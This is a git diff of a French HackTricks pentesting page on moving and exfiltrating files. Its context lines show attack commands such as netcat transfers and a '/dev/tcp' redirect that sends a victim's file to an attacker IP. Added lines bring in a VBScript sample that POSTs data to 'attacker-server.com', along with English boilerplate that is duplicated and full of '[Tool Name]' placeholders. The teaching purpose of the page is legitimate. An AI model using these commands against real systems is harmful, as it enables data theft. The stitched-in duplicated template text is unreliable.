@@ -16,7 +16,7 @@ Autres façons de soutenir HackTricks :
 
 **Groupe de sécurité Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -65,7 +65,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Téléverser des fichiers
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer affiche les GET et POST (également les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Module Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -150,7 +150,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Client** Windows
+### **Client Windows**
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -185,22 +185,63 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Windows
+# Exfiltration
+
+## Techniques
+
+### Exfiltration Over Command and Control Channel
+
+- **Description:** Data exfiltration can be achieved by sending commands to the compromised system to exfiltrate data over the command and control channel.
+  
+- **Detection:** Monitor network traffic for suspicious commands or data transfers over the command and control channel.
+
+### Exfiltration Over Alternative Protocol
+
+- **Description:** Data exfiltration can be achieved by using alternative protocols such as DNS, ICMP, or HTTPS to bypass network security controls.
+  
+- **Detection:** Monitor network traffic for unusual patterns or data transfers over non-standard protocols.
+
+## Tools
+
+- **[Tool Name]:** Description of the tool and how it can be used for data exfiltration.
+
+- **[Tool Name]:** Description of the tool and how it can be used for data exfiltration.
+
+## Countermeasures
+
+- Implement network segmentation to restrict communication between different parts of the network.
+  
+- Use encryption to protect data in transit and prevent unauthorized access to exfiltrated data.
 
 ---
 
-### Exfiltration
+# Exfiltration
 
-Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
+## Techniques
 
-1. **Email**: Sending data as email attachments.
-2. **FTP**: Transferring data using File Transfer Protocol.
-3. **DNS**: Encoding data in DNS queries.
-4. **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
-5. **Steganography**: Hiding data within other files or images.
-6. **Cloud Storage**: Uploading data to cloud storage services.
+### Exfiltration Over Command and Control Channel
 
-It is important for security professionals to be aware of these exfiltration methods in order to better protect systems and data from unauthorized access.
+- **Description:** Data exfiltration can be achieved by sending commands to the compromised system to exfiltrate data over the command and control channel.
+  
+- **Detection:** Monitor network traffic for suspicious commands or data transfers over the command and control channel.
+
+### Exfiltration Over Alternative Protocol
+
+- **Description:** Data exfiltration can be achieved by using alternative protocols such as DNS, ICMP, or HTTPS to bypass network security controls.
+  
+- **Detection:** Monitor network traffic for unusual patterns or data transfers over non-standard protocols.
+
+## Tools
+
+- **[Tool Name]:** Description of the tool and how it can be used for data exfiltration.
+
+- **[Tool Name]:** Description of the tool and how it can be used for data exfiltration.
+
+## Countermeasures
+
+- Implement network segmentation to restrict communication between different parts of the network.
+  
+- Use encryption to protect data in transit and prevent unauthorized access to exfiltrated data.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -223,6 +264,32 @@ sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
+
+---
+
+### Description
+
+Netcat (nc) is a versatile networking tool that can be used for various purposes, including exfiltration of data. It allows for creating connections to remote hosts, listening on ports, and transferring data between systems. Netcat can be used to exfiltrate data over the network in a stealthy manner.
+
+### Methodology
+
+1. **Basic Usage**: Netcat can be used to transfer files between systems by setting up a listener on the receiving end and connecting to it from the sending end.
+
+2. **Reverse Shells**: Netcat can be used to create reverse shells, allowing an attacker to gain remote access to a system and exfiltrate data.
+
+3. **Port Scanning**: Netcat can also be used for port scanning to identify open ports on a target system, which can then be used for exfiltration.
+
+4. **Encryption**: To secure data during exfiltration, Netcat can be used in combination with encryption tools like OpenSSL to encrypt the data before transmission.
+
+### Prevention
+
+1. **Firewall Rules**: Implement strict firewall rules to restrict the usage of Netcat on systems to prevent unauthorized data exfiltration.
+
+2. **Network Monitoring**: Monitor network traffic for any suspicious activities or the use of Netcat to exfiltrate data.
+
+3. **File Integrity Monitoring**: Implement file integrity monitoring to detect any unauthorized file transfers using Netcat.
+
+4. **User Training**: Provide security awareness training to users to educate them about the risks associated with tools like Netcat and how to prevent data exfiltration.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -234,7 +301,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Télécharger un fichier sur la victime
+### Téléverser un fichier à la victime
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -295,9 +362,37 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### Techniques d'exfiltration
+### Introduction
 
-Les scripts VBScript peuvent être utilisés pour exfiltrer des données en les envoyant par e-mail, en les téléchargeant sur un serveur distant via FTP ou en les copiant sur un lecteur réseau accessible. Ces méthodes peuvent être utilisées pour voler des informations sensibles d'un système compromis.
+VBScript (Visual Basic Scripting Edition) is a scripting language developed by Microsoft. It is commonly used for writing scripts to automate tasks on Windows operating systems.
+
+### Exfiltration Techniques
+
+VBScript can be used for exfiltrating data from a compromised system. Below are some techniques that can be used:
+
+1. **Writing to Files**: VBScript can be used to write data to files on the system, which can then be exfiltrated by the attacker.
+
+2. **Sending Emails**: VBScript can also be used to send emails with the exfiltrated data as attachments or within the email body.
+
+3. **HTTP Requests**: VBScript can make HTTP requests to a remote server controlled by the attacker, sending the exfiltrated data in the request body.
+
+### Example
+
+Below is an example of VBScript code that exfiltrates data by sending an HTTP request:
+
+```vbscript
+Dim objXMLHTTP
+Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+objXMLHTTP.Open "POST", "http://attacker-server.com/exfiltrate", False
+objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+objXMLHTTP.send "data=exfiltrated_data"
+```
+
+In this example, the VBScript code creates an HTTP POST request to "http://attacker-server.com/exfiltrate" with the exfiltrated data in the request body.
+
+### Mitigation
+
+To mitigate the risk of exfiltration using VBScript, organizations should restrict the use of VBScript on their systems and monitor for any suspicious VBScript activities. Regular security training for employees can also help in preventing attackers from using VBScript for exfiltration.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -351,7 +446,7 @@ Ensuite, copiez-collez le texte dans le shell Windows et un fichier appelé nc.e
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -363,7 +458,7 @@ Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
